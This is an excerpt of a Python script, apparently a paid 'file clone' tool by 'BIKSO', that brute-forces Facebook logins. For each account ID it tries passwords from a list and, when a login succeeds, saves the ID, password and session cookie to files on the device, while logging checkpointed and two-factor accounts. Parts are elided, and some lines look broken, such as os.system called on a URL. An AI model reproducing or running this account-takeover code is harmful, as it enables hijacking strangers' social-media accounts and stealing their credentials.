...
twf = []
loop = 0
os.system('https://www.facebook.com/profile.php?id=61555872831623')
...
YP      Y888888P Y88888P Y88888P 
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [\033[1;91m✓\033[1;92m] AUTHOR    \033[1;91m: \033[1;92mBIKSO    
 ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mFILE CLON
...
def chk(): 
  ...
  try: 
    httpCaht = requests.get('https://raw.githubusercontent.com/ANS-LOU/PAID-05/main/KAY.txt').text 
    if id in httpCaht: 
...
def ffb(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [BIKSO-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/BIKSO-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/BIKSO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                #####print('\r\r \033[1;35m[BIKSO-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                #######print('\r\r\x1b[1;90m [CHECKPOINT] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BIKSO-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
